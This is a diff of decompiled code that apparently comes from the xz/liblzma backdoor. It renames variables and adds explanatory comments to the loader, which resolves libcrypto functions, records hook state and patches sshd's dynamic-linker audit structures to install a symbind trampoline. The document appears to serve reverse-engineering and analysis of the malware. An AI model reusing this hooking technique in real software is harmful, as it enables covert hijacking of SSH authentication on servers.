-                                  ,&local_9d8,0x147,(void *)0x0);
+                                 (scan_cursor,(u8 *)loader_data.sshd_string_refs.syslog_bad_level.func_end
+                                  ,&probe_dasm_ctx,0x147,(void *)0x0);
               if (probe_success == FALSE) break;
-              if ((local_9d8.imm_zeroextended == 0) && ((local_9d8.prefix.flags_u16 & 0x100) != 0))
+              if ((probe_dasm_ctx.imm_zeroextended == 0) && ((probe_dasm_ctx.prefix.flags_u16 & 0x100) != 0))
               {
-                addr2 = (log_handler_fn *)local_9d8.mem_disp;
-                if (((uint)local_9d8.prefix.decoded.modrm & 0xff00ff00) == 0x5000000) {
-                  addr2 = (log_handler_fn *)
-                          ((u8 *)(local_9d8.mem_disp + (long)local_9d8.instruction) +
-                          CONCAT44(*(uint *)((u8 *)&local_9d8.instruction_size + 4),
-                                   (undefined4)local_9d8.instruction_size));
+                log_handler_ctx_candidate = (log_handler_fn *)probe_dasm_ctx.mem_disp;
+                if (((uint)probe_dasm_ctx.prefix.decoded.modrm & 0xff00ff00) == 0x5000000) {
+                  log_handler_ctx_candidate = (log_handler_fn *)
+                          ((u8 *)(probe_dasm_ctx.mem_disp + (long)probe_dasm_ctx.instruction) +
+                          CONCAT44(*(uint *)((u8 *)&probe_dasm_ctx.instruction_size + 4),
+                                   (undefined4)probe_dasm_ctx.instruction_size));
                 }
                 local_a90 = 0;
-                pplVar46 = (log_handler_fn *)
-                           elf_get_data_segment(&local_980.main_info,&local_a90,FALSE);
-                if ((((pplVar46 != (log_handler_fn *)0x0) &&
-                     (addr2 < (log_handler_fn *)(local_a90 + (long)pplVar46))) &&
-                    (pplVar46 <= addr2)) && (addr1 != addr2)) goto LAB_00106b3c;
+                log_handler_tmp_ptr = (log_handler_fn *)
+                           elf_get_data_segment(&loader_data.main_info,&local_a90,FALSE);
+                if ((((log_handler_tmp_ptr != (log_handler_fn *)0x0) &&
+                     (log_handler_ctx_candidate < (log_handler_fn *)(local_a90 + (long)log_handler_tmp_ptr))) &&
+                    (log_handler_tmp_ptr <= log_handler_ctx_candidate)) && (log_handler_slot_candidate != log_handler_ctx_candidate)) goto LAB_00106b3c;
               }
-              scan_cursor = local_9d8.instruction +
-                        CONCAT44(*(uint *)((u8 *)&local_9d8.instruction_size + 4),
-                                 (undefined4)local_9d8.instruction_size);
-            } while (local_9d8.instruction +
-                     CONCAT44(*(uint *)((u8 *)&local_9d8.instruction_size + 4),
-                              (undefined4)local_9d8.instruction_size) <
-                     local_980.sshd_string_refs.syslog_bad_level.func_end);
+              scan_cursor = probe_dasm_ctx.instruction +
+                        CONCAT44(*(uint *)((u8 *)&probe_dasm_ctx.instruction_size + 4),
+                                 (undefined4)probe_dasm_ctx.instruction_size);
+            } while (probe_dasm_ctx.instruction +
+                     CONCAT44(*(uint *)((u8 *)&probe_dasm_ctx.instruction_size + 4),
+                              (undefined4)probe_dasm_ctx.instruction_size) <
+                     loader_data.sshd_string_refs.syslog_bad_level.func_end);
             goto LAB_00106ab1;
           }
         }
 LAB_00106735:
-        local_b48 = local_b48 + local_a30.instruction_size;
+        syslog_bad_level_cursor = syslog_bad_level_cursor + syslog_dasm_ctx.instruction_size;
       } while( TRUE );
     }
   }
 LAB_00106bf0:
-  libcrypto_allocator->opaque = local_980.elf_handles.libcrypto;
+  libcrypto_allocator->opaque = loader_data.elf_handles.libcrypto;
   if (bn_bin2bn_symbol != (Elf64_Sym *)0x0) {
     symbol_rva = bn_bin2bn_symbol->st_value;
-    symbol_module_ehdr = (local_980.elf_handles.libcrypto)->elfbase;
-    resolved_count_ptr = &(local_b10->imported_funcs).resolved_imports_count;
+    symbol_module_ehdr = (loader_data.elf_handles.libcrypto)->elfbase;
+    resolved_count_ptr = &(hooks_data->imported_funcs).resolved_imports_count;
     *resolved_count_ptr = *resolved_count_ptr + 1;
-    (local_b10->imported_funcs).EVP_DecryptUpdate =
+    (hooks_data->imported_funcs).EVP_DecryptUpdate =
          (pfn_EVP_DecryptUpdate_t)(symbol_module_ehdr->e_ident + symbol_rva);
   }
   if (bn_dup_symbol != (Elf64_Sym *)0x0) {
     symbol_rva = bn_dup_symbol->st_value;
-    symbol_module_ehdr = (local_980.elf_handles.libcrypto)->elfbase;
-    resolved_count_ptr = &(local_b10->imported_funcs).resolved_imports_count;
+    symbol_module_ehdr = (loader_data.elf_handles.libcrypto)->elfbase;
+    resolved_count_ptr = &(hooks_data->imported_funcs).resolved_imports_count;
     *resolved_count_ptr = *resolved_count_ptr + 1;
-    (local_b10->imported_funcs).EVP_DecryptFinal_ex =
+    (hooks_data->imported_funcs).EVP_DecryptFinal_ex =
          (pfn_EVP_DecryptFinal_ex_t)(symbol_module_ehdr->e_ident + symbol_rva);
   }
   probe_success = init_imported_funcs(imported_funcs);
   if (((((((probe_success != FALSE) &&
-          (lzma_free((local_b10->imported_funcs).EVP_MD_CTX_new,libcrypto_allocator),
-          (local_b10->libc_imports).resolved_imports_count == 0xc)) &&
+          (lzma_free((hooks_data->imported_funcs).EVP_MD_CTX_new,libcrypto_allocator),
+          (hooks_data->libc_imports).resolved_imports_count == 0xc)) &&
          // AutoDoc: Stream every resolved hook/trampoline pointer into `secret_data` so telemetry and the command channel can attest to the install.
          (probe_success = secret_data_append_from_address
                              ((void *)0x1,(secret_data_shift_cursor_t)0x145,0x78,0x18),
@@ -846,48 +846,49 @@ LAB_00106bf0:
            (probe_success = secret_data_append_item
                                ((secret_data_shift_cursor_t)0x114,0x11,0x16,0x10,
                                 (u8 *)elf_functions_table->elf_parse), probe_success != FALSE)) &&
-          ((local_b10->global_ctx).secret_bits_filled == 0x1c8)))))) {
-    *(local_b10->ldso_ctx).libcrypto_l_name = (char *)local_b10;
-    local_980.sshd_link_map = local_980.sshd_link_map + local_ac8 + 8;
-    auditstate_snapshot = *(u32 *)local_980.sshd_link_map;
-    (local_b10->ldso_ctx).sshd_auditstate_bindflags_ptr = (u32 *)local_980.sshd_link_map;
-    (local_b10->ldso_ctx).sshd_auditstate_bindflags_old_value = auditstate_snapshot;
-    *(u32 *)local_980.sshd_link_map = 2;
+          // AutoDoc: Refuse to touch `_dl_audit` until telemetry shows all 0x1c8 hook/trampoline bits recorded in `secret_data`.
+          ((hooks_data->global_ctx).secret_bits_filled == 0x1c8)))))) {
+    *(hooks_data->ldso_ctx).libcrypto_l_name = (char *)hooks_data;
+    loader_data.sshd_link_map = loader_data.sshd_link_map + link_map_delta + 8;
+    auditstate_snapshot = *(u32 *)loader_data.sshd_link_map;
+    (hooks_data->ldso_ctx).sshd_auditstate_bindflags_ptr = (u32 *)loader_data.sshd_link_map;
+    (hooks_data->ldso_ctx).sshd_auditstate_bindflags_old_value = auditstate_snapshot;
+    *(u32 *)loader_data.sshd_link_map = 2;
     // AutoDoc: Flip sshd’s `l_audit_any_plt` bit so `_dl_audit_symbind_alt` starts calling our symbind trampoline for every sshd→libcrypto PLT.
-    audit_slot_byte = (byte *)(local_b10->ldso_ctx).sshd_link_map_l_audit_any_plt_addr;
-    *audit_slot_byte = *audit_slot_byte | (local_b10->ldso_ctx).link_map_l_audit_any_plt_bitmask;
-    local_980.libcrypto_link_map = local_980.libcrypto_link_map + local_ac8 + 8;
-    auditstate_snapshot = *(u32 *)local_980.libcrypto_link_map;
-    (local_b10->ldso_ctx).libcrypto_auditstate_bindflags_ptr = (u32 *)local_980.libcrypto_link_map;
-    (local_b10->ldso_ctx).libcrypto_auditstate_bindflags_old_value = auditstate_snapshot;
-    audit_ifaces_slot_ptr = &(local_b10->ldso_ctx).hooked_audit_ifaces;
-    *(u32 *)local_980.libcrypto_link_map = 1;
+    audit_slot_byte = (byte *)(hooks_data->ldso_ctx).sshd_link_map_l_audit_any_plt_addr;
+    *audit_slot_byte = *audit_slot_byte | (hooks_data->ldso_ctx).link_map_l_audit_any_plt_bitmask;
+    loader_data.libcrypto_link_map = loader_data.libcrypto_link_map + link_map_delta + 8;
+    auditstate_snapshot = *(u32 *)loader_data.libcrypto_link_map;
+    (hooks_data->ldso_ctx).libcrypto_auditstate_bindflags_ptr = (u32 *)loader_data.libcrypto_link_map;
+    (hooks_data->ldso_ctx).libcrypto_auditstate_bindflags_old_value = auditstate_snapshot;
+    audit_ifaces_slot_ptr = &(hooks_data->ldso_ctx).hooked_audit_ifaces;
+    *(u32 *)loader_data.libcrypto_link_map = 1;
     audit_ifaces_zero_cursor = audit_ifaces_slot_ptr;
     for (loop_idx = 0x1e; loop_idx != 0; loop_idx = loop_idx + -1) {
       *(undefined4 *)&audit_ifaces_zero_cursor->activity = 0;
       audit_ifaces_zero_cursor = (audit_ifaces *)((long)audit_ifaces_zero_cursor + (ulong)wipe_stride * -8 + 4);
     }
-    (local_b10->ldso_ctx).hooked_audit_ifaces.symbind =
+    (hooks_data->ldso_ctx).hooked_audit_ifaces.symbind =
          (audit_symbind_fn_t)params->hook_ctx->symbind64_trampoline;
-    *(local_b10->ldso_ctx)._dl_audit_ptr = audit_ifaces_slot_ptr;
-    *(local_b10->ldso_ctx)._dl_naudit_ptr = 1;
+    *(hooks_data->ldso_ctx)._dl_audit_ptr = audit_ifaces_slot_ptr;
+    *(hooks_data->ldso_ctx)._dl_naudit_ptr = 1;
     loop_idx = 0;
-    libc_allocator = local_980.active_lzma_allocator;
+    libc_allocator = loader_data.active_lzma_allocator;
     while (libc_allocator != (lzma_allocator *)0x0) {
-      *(undefined1 *)((long)&(local_980.active_lzma_allocator)->alloc + loop_idx) =
-           *(undefined1 *)((long)&local_980.saved_lzma_allocator.alloc + loop_idx);
+      *(undefined1 *)((long)&(loader_data.active_lzma_allocator)->alloc + loop_idx) =
+           *(undefined1 *)((long)&loader_data.saved_lzma_allocator.alloc + loop_idx);
       libc_allocator = (lzma_allocator *)(loop_idx + -0x17);
       loop_idx = loop_idx + 1;
     }
     goto LAB_00105a81;
   }
 LAB_00105a60:
-  libc_allocator = &local_980.saved_lzma_allocator;
-  init_ldso_ctx(&local_b10->ldso_ctx);
+  libc_allocator = &loader_data.saved_lzma_allocator;
+  init_ldso_ctx(&hooks_data->ldso_ctx);
   loop_idx = 0;
-  libcrypto_allocator = local_980.active_lzma_allocator;
+  libcrypto_allocator = loader_data.active_lzma_allocator;
   while (libcrypto_allocator != (lzma_allocator *)0x0) {
-    *(undefined1 *)((long)&(local_980.active_lzma_allocator)->alloc + loop_idx) =
+    *(undefined1 *)((long)&(loader_data.active_lzma_allocator)->alloc + loop_idx) =
          *(undefined1 *)((long)&libc_allocator->alloc + loop_idx);
     libcrypto_allocator = (lzma_allocator *)(loop_idx + -0x17);
     loop_idx = loop_idx + 1;
@@ -898,6 +899,7 @@ LAB_00105a81:
   (entry_ctx_ptr->got_ctx).cpuid_got_slot = (void *)0x0;
   (entry_ctx_ptr->got_ctx).cpuid_slot_index = 0;
   (entry_ctx_ptr->got_ctx).got_base_offset = 0;
+  // AutoDoc: Clear the cpuid GOT bookkeeping on exit so glibc repopulates the slot naturally the next time `_dl_runtime_resolve` runs.
   entry_ctx_ptr->cpuid_random_symbol_addr = (void *)0x1;
   auth_log_reloc = (int *)cpuid_basic_info(0);
   if (*auth_log_reloc != 0) {
